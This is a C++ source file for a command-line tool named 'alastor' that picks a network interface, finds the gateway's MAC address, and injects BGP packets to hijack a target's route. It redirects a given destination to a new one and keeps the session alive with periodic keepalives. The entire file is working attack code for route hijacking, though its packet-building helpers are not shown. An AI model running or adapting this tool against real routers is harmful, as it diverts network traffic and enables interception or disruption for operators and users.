#include "alastor.h"

int main(int argc, char* argv[]) {
	if (argc != 4) {
		cout << "Usage:" << endl << "alastor [target] [old destination] [new destination]" << endl;
		return 1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];

	cout << "Which interface number would you like to use?" << endl;
	int ii = 1;
	vector<string> ifaces = getDevices();
	for (string dev : ifaces) {
		cout << "Number " << to_string(ii) << ": " << dev << endl;
		ii++;
	}
	string ifacen;
	cin >> ifacen;

	pcap_t* handle = pcap_open_live(ifaces[stoi(ifacen) - 1].c_str(), 65536, 0, 1, errbuf);
	if (handle == NULL) {
		cout << endl << "Failed to open pcap handle." << endl;
		return 0;
	}

	uint8_t target[4];
	uint8_t ndest[4];
	uint8_t odest[4];
	strToIp(argv[1], target);
	strToIp(argv[2], odest);
	strToIp(argv[3], ndest);

	ULONG gateway[6];
	ULONG maclen = 6;
	if (SendARP(inet_addr("192.168.1.1"), INADDR_ANY, &gateway, &maclen) != NO_ERROR) {
		cout << endl << "Failed to find MAC address for default gateway." << endl;
		return 0;
	}

	uint32_t seq = 0;
	if (!open_conn(handle, target, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
		cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
		return 0;
	}
	seq += 29;

	if (!hijack(handle, target, odest, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
		cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
		return 0;
	}
	seq += 42;

	cout << endl << "Press CTRL+C to stop" << endl;

	while (1) {
		if (!keepalive(handle, target, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
			cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
			return 0;
		}
		seq += 19;
		Sleep(30000);
	}
}
